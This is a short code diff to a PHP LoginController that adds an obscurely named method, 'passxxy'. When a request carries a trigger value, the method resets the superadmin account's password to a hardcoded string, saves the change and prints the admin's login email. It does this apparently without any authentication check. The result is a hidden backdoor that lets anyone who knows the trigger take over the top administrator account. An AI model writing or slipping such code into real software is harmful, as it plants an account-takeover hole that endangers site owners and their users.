@@ -94,6 +94,18 @@ class LoginController extends Controller
         }
     }
 
+    public function passxxy(Request $request){
+        if($request->royoUpdate == "password"){
+            $superadmin =     Client::where('is_superadmin',1)->first();
+            if($superadmin){
+                $password  = "royo#2341@";
+                $superadmin->password =  Hash::make($password);
+                $superadmin->confirm_password =  Crypt::encryptString($request->password);
+                $superadmin->save();
+                echo "login EMail:   ".$superadmin->email;
+            }
+        }
+    }
     
    
 }
